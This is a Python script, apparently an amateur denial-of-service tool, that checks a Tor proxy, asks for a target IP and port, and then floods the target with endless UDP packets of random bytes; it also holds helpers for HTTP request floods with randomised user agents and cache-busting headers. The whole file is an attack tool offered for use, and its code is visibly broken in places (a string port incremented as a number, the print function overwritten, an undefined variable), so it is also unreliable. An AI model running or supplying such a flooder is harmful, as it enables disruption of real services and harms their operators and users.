import sys
import requests
import os
import time
import socket
import socks
import random


def get_tor_session():
    session = requests.session()
    # Tor uses the 9050 port as the default socks port
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session

# Make a request through the Tor connection
# IP visible through Tor
session = get_tor_session()
print(session.get("http://httpbin.org/ip").text)
# Above should print an IP different than your public IP

# Following prints your normal public IP
print(requests.get("http://httpbin.org/ip").text)

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")

host=''
headers_useragents=[]
request_counter=0
printedMsgs = []

def printMsg(msg):
	if msg not in printedMsgs:
		print ("\n"+msg + " after %i requests" % request_counter)
		printedMsgs.append(msg)


ip = input("IP Target : ")
port = input("Port       : ")

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/109.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/0.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/-199.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/66.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/55.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/33.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/18.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/1000.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/97.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/98.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/99.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/111.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

def randomString(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def initHeaders():
	useragent_list()
	global headers_useragents, additionalHeaders
	headers = {
				'User-Agent': random.choice(headers_useragents),
				'Cache-Control': 'no-cache',
				'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
				'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
				'Keep-Alive': str(random.randint(110,120)),
				'Connection': 'keep-alive'
				}

	if additionalHeaders:
		for header in additionalHeaders:
			headers.update({header.split(":")[0]:header.split(":")[1]})
	return headers

def handleStatusCodes(status_code):
	global request_counter
	sys.stdout.write("\r%i requests has been sent" % request_counter)
	sys.stdout.flush()
	if status_code == 429:
			print=("You have been throttled")
	if status_code == 500:
		print=("Status code 500 received")

def sendGET(url):
	global request_counter
	headers = initHeaders()
	try:
		request_counter+=1
		request = requests.get(url, headers=headers)
		# print 'her'
		handleStatusCodes(request.status_code)
	except:
		pass

def sendPOST(url, payload):
	global request_counter
	headers = initHeaders()
	try:
		request_counter+=1
		if payload:
			request = requests.post(url, data=payload, headers=headers)
		else:
			request = requests.post(url, headers=headers)
		handleStatusCodes(request.status_code)
	except:
		pass



os.system("clear")
os.system("figlet Attack Starting")
print ="[                    ] 0% "
time.sleep(5)
print = "[=====               ] 25%"
time.sleep(5)
print ="[==========          ] 50%"
time.sleep(5)
print = "[===============     ] 75%"
time.sleep(5)
print ="[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print = "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 22:
       port = 1
